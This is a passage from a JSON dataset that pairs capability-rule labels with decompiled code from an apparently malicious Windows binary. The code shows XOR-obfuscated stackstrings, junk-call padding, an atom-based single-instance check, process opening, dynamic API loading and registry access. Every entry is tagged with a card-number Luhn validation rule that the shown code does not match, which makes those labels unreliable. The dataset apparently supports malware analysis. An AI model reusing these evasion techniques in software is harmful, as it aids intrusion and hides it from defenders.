var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1573
    },
    "00404ab4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00404ab4(uint param_1)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpString;\n    uint lpExitTime;\n    uint lpKernelTime;\n    uint lpUserTime;\n    uint lpCreationTime;\n    uint var_2ch;\n    int32_t hObject;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar6 = 8;\n    puVar7 = &lpCreationTime;\n    var_20h = param_1;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_24h = 0;\n    puVar7 = &lpExitTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpKernelTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpUserTime;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (hObject != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)\n                          (hObject, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n        if (iVar4 != 0) {\n            var_18h = 0x446b0d49;\n            var_14h = 0x44140b7c;\n            var_10h = 0x4b745163;\n            var_ch._0_1_ = 0x6c;\n            var_8h = 0x6146696c;\n            var_4h._0_2_ = 0x334c;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar6 = 0;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar3 != 0x944cdd) {\n                    var_1ch = 6;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpString, iVar4, var_20h, var_2ch, lpCreationTime);\n            iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n            uVar5 = var_24h;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n                if (iVar1 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                    (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                    uVar5 = 1;\n                }\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return uVar5 ^ 1;\n}\n",
        "token_count": 1051
    },
    "00404d73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404d73(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x4121a0;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x4165a0;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.00404c1f();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00404c1f();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00409240(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 553
    },
    "004086af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004086af(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 423
    },
    "0040890f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040890f(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    hHeap = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, hHeap * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, hHeap * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_14h = fcn.00404132();\n                var_14h = var_14h + 2;\n                var_30h = 0x6c02314a;\n                var_2ch = 0x6e1f6f1f;\n                var_28h = 0x310e6a0e;\n                var_24h = 0x6f6a6c1a;\n                var_20h = 0x6c6e316f;\n                var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x6a);\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_18h = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                    if (iVar3 != 0xd393bc) {\n                        var_10h = 5;\n                        *(iVar4 + iVar2) = *(&var_20h + iVar4 % 5) ^ (iVar4 + iVar2)[&var_30h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, iVar2, uVar1);\n                (*pcVar5)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_78h = 0xb123d19;\n                    var_74h = 0x6458031c;\n                    var_70h = 0x12585914;\n                    var_6ch = 0x590e6458;\n                    var_68h = 0x44494450;\n                    var_64h = 0x1450436c;\n                    var_60h = 0x1c024375;\n                    var_5ch = 0x6c5d4119;\n                    var_58h._0_2_ = 0x7457;\n                    var_58h._2_1_ = 0x7f;\n                    var_58h._3_1_ = 8;\n                    var_54h = 0x103691e;\n                    var_50h = 0x690c121c;\n                    var_4ch = 0x41445c43;\n                    var_48h = 0x1612261f;\n                    var_44h = 0x440d4455;\n                    var_40h = 0xd101d6c;\n                    var_3ch = 0x49436c58;\n                    var_38h._0_2_ = 0x6b78;\n                    var_38h._2_1_ = 0x78;\n                    var_20h = 0x79664978;\n                    var_1ch._0_2_ = 0x6175;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_14h = &var_78h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                        if (iVar2 != 0x25f897) {\n                            var_14h = 6;\n                            *(iVar4 + iVar3) = *(&var_20h + iVar4 % 6) ^ (iVar4 + iVar3)[&var_78h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_10h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_10h, var_10h);\n                    iVar4 = fcn.0040dd0b(nNumberOfBytesToWrite);\n                    iVar2 = var_18h;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.00408761(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1748
    },
    "0040a0ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040a0ee(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint *var_8ch;\n    uint *var_88h;\n    uint var_80h;\n    uint hObject;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t lpLibFileName;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpszLongPath;\n    \n    lpszLongPath = *0x41cd94;\n    var_38h = 0x31123817;\n    puVar8 = &lpDst;\n    for (iVar6 = 0x410; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x6556321a;\n    var_30h = 0x385b7355;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_2ch = 0x32563117;\n    var_28h = 0x73426564;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_24h = 0x3116384b;\n    var_20h = 0x655d3207;\n    puVar8 = &lpszShortPath;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_1ch = 0x3801735c;\n    var_18h = 0x322f3157;\n    var_14h = 0x735c655b;\n    var_10h = 0x314b3856;\n    var_ch._0_2_ = 0x3216;\n    var_ch._2_1_ = 0x40;\n    var_ch._3_1_ = 0x65;\n    var_8h._0_2_ = 0x7354;\n    var_8h._2_1_ = 0x32;\n    var_8h._3_1_ = 0x38;\n    var_58h = 0x31653832;\n    var_54h._0_1_ = 0x73;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_5ch = 5;\n    iVar7 = 0;\n    var_60h = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar3 != 0xa5c1a3) {\n            *(iVar7 + iVar6) = *(&var_58h + iVar7 % var_5ch) ^ (iVar7 + iVar6)[&var_38h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_24h = 0x4e75664b;\n    var_20h = 0x5a466b2a;\n    var_1ch = 0x6618496c;\n    var_18h = 0x6b284e2e;\n    var_14h = 0x493a5a14;\n    var_10h = 0x4e7f664b;\n    var_ch._0_2_ = 0x6b3a;\n    var_ch._2_1_ = 0x44;\n    var_ch._3_1_ = 0x5a;\n    var_8h._0_2_ = 0x494e;\n    var_50h = 0x4e5a666b;\n    var_4ch._0_1_ = 0x49;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_58h = iVar6;\n    lpszLongPath = &var_24h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0xa15409) {\n            *(iVar7 + iVar6) = *(&var_50h + iVar7 % var_5ch) ^ (iVar7 + iVar6)[&var_24h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar6, &lpszShortPath);\n    var_10h = 0x573c5713;\n    var_ch._0_2_ = 0x6114;\n    var_ch._2_1_ = 0x36;\n    var_ch._3_1_ = 0x49;\n    var_8h._0_2_ = 0x7a24;\n    var_8h._2_1_ = 0x61;\n    var_8h._3_1_ = 0x57;\n    lpLibFileName = 0x57495761;\n    puVar8 = &var_9ch;\n    for (iVar6 = 0x3c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_44h._0_1_ = 0x7a;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_50h = var_90h;\n    lpszLongPath = &var_10h - var_90h;\n    do {\n        iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar7 != 0xc3e46b) {\n            *(iVar6 + var_90h) = *(&lpLibFileName + iVar6 % var_5ch) ^ (iVar6 + var_90h)[&var_10h - var_90h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_8ch = &lpDst;\n    var_9ch = 0x3c;\n    var_88h = &ARG_0;\n    var_80h = 3;\n    var_98h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_10h = 0x223c211b;\n    var_ch._0_2_ = 0x7b79;\n    var_ch._2_1_ = 0x5b;\n    var_ch._3_1_ = 0x57;\n    var_8h._0_2_ = 0x590a;\n    var_8h._2_1_ = 0x24;\n    var_8h._3_1_ = 0x69;\n    var_40h = 0x6e796948;\n    var_3ch._0_1_ = 0x35;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    lpszLongPath = &var_10h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar3 != 0x3703e4) {\n            *(iVar7 + iVar6) = *(&var_40h + iVar7 % var_5ch) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_14h = 0x2e560a22;\n    var_10h = 0x561a3425;\n    var_ch._0_2_ = 0x3c21;\n    var_ch._2_1_ = 5;\n    var_ch._3_1_ = 7;\n    var_8h._0_2_ = 0x3a76;\n    var_8h._2_1_ = 0x1e;\n    var_8h._3_1_ = 0x71;\n    var_40h = 0x42336271;\n    var_3ch._0_1_ = 0x49;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpszLongPath = &var_14h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xc165aa) {\n            *(iVar7 + iVar6) = *(&var_40h + iVar7 % var_5ch) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_94h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar7 = (*pcVar5)(&var_9ch);\n        if (iVar7 != 0) break;\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_50h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_58h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_60h);\n    (*pcVar5)(uVar2);\n    return 1;\n}\n",
        "token_count": 2900
    },
    "0040a626": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.0040a626(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h = 0x78147229;\n    var_44h = 0x722c760f;\n    var_40h = 0x760a7813;\n    var_3ch = 0x781e722f;\n    var_38h = 0x72227605;\n    var_34h = 0x7600781d;\n    var_30h = 0x78187225;\n    var_2ch._0_2_ = 0x7603;\n    var_2ch._2_1_ = 0x38;\n    stack0xffffffd3 = 0x1e780772;\n    var_25h = 0x2723b76;\n    var_21h = 0x3e761978;\n    var_1dh = 0x14780172;\n    var_19h = 0xc723176;\n    var_15h._0_2_ = 0x6c78;\n    var_15h._2_1_ = 0x76;\n    var_10h = 0x78767248;\n    var_ch._0_2_ = 0x766c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar5 != 0x117232) {\n            var_4h = 0x6;\n            *(iVar8 + iVar4) = *(&var_10h + iVar8 % 6) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.0040a4dc();\n    puVar7 = uVar6 % 0x38 + 8;\n    var_10h = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = var_10h;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (var_10h != NULL) {\n                do {\n                    iVar8 = fcn.0040a4dc();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 999
    },
    "0040b8ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040b8ca(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41cd94);\n    iVar4 = fcn.0040e60d();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x0040b95a;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x0040b95a:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 475
    },
    "0040c5be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040c5be(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41cd40), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41cd40));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 115
    },
    "0040e310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e310(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint lpSubKey;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint phkResult;\n    \n    uStack100 = *0x41097c;\n    uStack104 = *0x410978;\n    uStack108 = *0x410974;\n    lpSubKey = *0x410970;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41cdbc;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x410980;\n    uStack92 = *0x410984;\n    uStack88 = *0x410988;\n    uStack84 = *0x41098c;\n    var_3ch = *0x410960;\n    uStack60 = *0x410964;\n    uStack56 = *0x410968;\n    uStack52 = *0x41096c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    phkResult = 